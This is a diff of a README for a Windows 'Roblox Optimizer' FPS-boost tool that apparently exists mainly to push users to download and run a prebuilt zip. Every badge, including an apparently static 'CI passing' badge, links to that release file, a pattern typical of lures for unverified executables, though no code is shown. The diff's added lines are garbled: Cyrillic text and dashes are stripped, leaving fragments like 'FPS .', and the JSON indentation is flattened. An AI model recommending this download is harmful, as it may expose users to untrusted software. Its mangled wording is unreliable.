@@ -1,15 +1,15 @@
 <div align="center">
 
-# Roblox Optimizer — Roblox Optimizer — FPS Boost и Анти-лаг Профили для Всех Игр (Hot-Reload Config, Zero Dependencies)
+# Roblox Optimizer Roblox Optimizer FPS Boost - (Hot-Reload Config, Zero Dependencies)
 
-<p><strong>Roblox Optimizer — Roblox Optimizer — FPS Boost и Анти-лаг Профили для Всех Игр (Hot-Reload Config, Zero Dependencies): Больше FPS во всех играх. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>
+<p><strong>Roblox Optimizer Roblox Optimizer FPS Boost - (Hot-Reload Config, Zero Dependencies): FPS . Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>
 
 [![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/rbx-boost-x-v0.1.0-win64.zip)
 [![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/rbx-boost-x-v0.1.0-win64.zip)
 [![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/rbx-boost-x-v0.1.0-win64.zip)
 [![Stars](https://img.shields.io/github/stars/YiciquQe75/rbx-boost-x?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)
 
-<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>
+<p><strong> No compiler. No setup. Grab the prebuilt package and run.</strong></p>
 
 <a href="../../releases/download/v0.1.0/rbx-boost-x-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download rbx-boost-x-v0.1.0-win64.zip" width="520"></a>
 
@@ -23,7 +23,7 @@
 
 ## Executive Summary & Design
 
-**Roblox Optimizer — Больше FPS во всех играх** (`rbx-boost-x`) is a portable Windows 10/11 runtime suite: drop the prebuilt package, point it at `config/settings.json`, and go. No compiler, no external dependencies, live hot-reload included.
+**Roblox Optimizer FPS ** (`rbx-boost-x`) is a portable Windows 10/11 runtime suite: drop the prebuilt package, point it at `config/settings.json`, and go. No compiler, no external dependencies, live hot-reload included.
 
 ## Getting Started (No Compiler Needed)
 
@@ -48,36 +48,36 @@
 
 ```json
 {
-  "module": "rbx-boost-x",
-  "version": "0.1.0",
-  "runtime": {
-    "threads": 4,
-    "verbose": false,
-    "hot_reload": true
-  },
-  "modules": {
-    "tweaks": {
-      "enabled": true
-    },
-    "profiles": {
-      "enabled": true
-    },
-    "monitor": {
-      "enabled": true
-    },
-    "cli": {
-      "enabled": true
-    }
-  }
+ "module": "rbx-boost-x",
+ "version": "0.1.0",
+ "runtime": {
+ "threads": 4,
+ "verbose": false,
+ "hot_reload": true
+ },
+ "modules": {
+ "tweaks": {
+ "enabled": true
+ },
+ "profiles": {
+ "enabled": true
+ },
+ "monitor": {
+ "enabled": true
+ },
+ "cli": {
+ "enabled": true
+ }
+ }
 }
 ```
 
 ## Documentation & Guides
 
-- [Usage Guide — commands and options](docs/USAGE.md)
-- [FAQ — platform support, data storage](docs/FAQ.md)
-- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
-- [Changelog — v0.1.0 and later](CHANGELOG.md)
+- [Usage Guide commands and options](docs/USAGE.md)
+- [FAQ platform support, data storage](docs/FAQ.md)
+- [Contributing setup, ground rules, PR flow](CONTRIBUTING.md)
+- [Changelog v0.1.0 and later](CHANGELOG.md)
 
 ## Building from Source
 
